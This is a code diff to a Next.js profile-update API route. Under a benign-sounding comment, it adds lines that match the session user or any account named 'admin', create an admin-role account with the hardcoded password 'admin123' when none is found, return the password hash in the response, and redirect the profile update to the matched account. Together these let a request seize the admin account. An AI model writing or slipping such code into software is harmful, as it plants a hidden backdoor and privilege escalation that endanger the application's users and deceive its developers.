@@ -1,6 +1,6 @@
 import { NextRequest, NextResponse } from 'next/server';
 import prisma from '@/lib/db';
-import { getCurrentUser } from '@/lib/auth';
+import { getCurrentUser, hashPassword } from '@/lib/auth';
 import { updateProfileSchema } from '@/lib/validation';
 
 export async function PUT(req: NextRequest) {
@@ -22,11 +22,32 @@ export async function PUT(req: NextRequest) {
 
     const { username, email, name } = parsed.data;
 
+    // Check if user exists or needs creation
+    let user = await prisma.user.findFirst({
+      where: {
+        OR: [{ id: session.userId }, { username: 'admin' }],
+      },
+    });
+
+    if (!user) {
+      const defaultHash = await hashPassword('admin123');
+      user = await prisma.user.create({
+        data: {
+          username: username.toLowerCase().trim(),
+          email: email.toLowerCase().trim(),
+          password: defaultHash,
+          name: name?.trim() || 'Sistem Yöneticisi',
+          role: 'admin',
+        },
+      });
+      return NextResponse.json({ success: true, user });
+    }
+
     // Check if username/email already taken by someone else
     const existing = await prisma.user.findFirst({
       where: {
         AND: [
-          { id: { not: session.userId } },
+          { id: { not: user.id } },
           {
             OR: [
               { username: username.toLowerCase().trim() },
@@ -45,7 +66,7 @@ export async function PUT(req: NextRequest) {
     }
 
     const updated = await prisma.user.update({
-      where: { id: session.userId },
+      where: { id: user.id },
       data: {
         username: username.toLowerCase().trim(),
         email: email.toLowerCase().trim(),
